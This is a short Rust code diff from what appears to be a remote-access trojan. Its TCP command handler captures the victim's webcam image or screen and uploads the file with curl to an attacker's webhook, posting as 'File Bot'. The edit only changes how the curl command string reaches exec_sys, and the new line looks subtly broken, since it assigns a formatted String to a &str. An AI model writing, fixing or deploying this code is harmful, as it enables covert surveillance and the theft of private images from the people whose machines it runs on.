@@ -101,12 +101,14 @@ fn handle_input(mut stream: TcpStream) {
                         }
                         stream.write(b"Webcam captured successfully.").unwrap();
                        let command1 = r#"curl -i -H 'Expect: application/json' -F file=@shot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
-                        exec_sys(format!("{} {}", command1, webhook));
+                        let to_str: &str = format!("{} {}", command1, webhook);
+                         exec_sys(to_str);
                         } else if content == "screen" {
                             screenshot();
                             stream.write(b"Screen captured successfully.").unwrap();
                             let command2 = r#"curl -i -H 'Expect: application/json' -F file=@screenshot.png -F 'payload_json={ "wait": true, "content": " ", "username": "File Bot" }'"#;
-                            exec_sys(format!("{} {}", command2, webhook));
+                            let to_str: &str = format!("{} {}", command2, webhook);
+                            exec_sys(to_str);
                             
                         }
                         
